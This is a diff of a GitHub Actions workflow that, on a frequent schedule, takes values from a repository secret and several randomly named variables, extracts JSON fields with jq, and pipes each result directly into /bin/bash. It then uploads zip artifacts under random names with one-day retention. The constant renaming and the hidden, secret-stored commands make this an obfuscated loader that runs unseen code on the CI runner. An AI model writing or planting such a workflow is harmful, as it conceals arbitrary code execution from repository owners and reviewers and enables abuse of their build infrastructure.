@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '51 4,10,16,22 * * *'
+    - cron: '15 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,17 +16,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          qafh41031: ${{ secrets.qafh41031 }}
+          cehk93600: ${{ secrets.cehk93600 }}
         run: |
-          printf '%s' "$qafh41031" | jq -r .z30 | /bin/bash
-          echo $l7663 | jq -r .ztd56672 | /bin/bash
-          echo $u8 | jq -r .t039 | /bin/bash
-          echo $v798 | jq -r .tcd3 | /bin/bash
-          printf '%s' "$c509" | jq -r .dxgtv2 | /bin/bash
+          printf '%s' "$cehk93600" | jq -r .yyss9903 | /bin/bash
+          echo $hlt0 | jq -r .jl6 | /bin/bash
+          printf '%s' "$qs6808" | jq -r .bw696 | /bin/bash
+          echo $ldse9418 | jq -r .lxm5530 | /bin/bash
+          echo $ekg69497 | jq -r .ssh747 | /bin/bash
+          printf '%s' "$c24" | jq -r .rv5896 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: AfBwgVJQ
+          name: NP0qImyF
           path: "*.zip"
           retention-days: 1
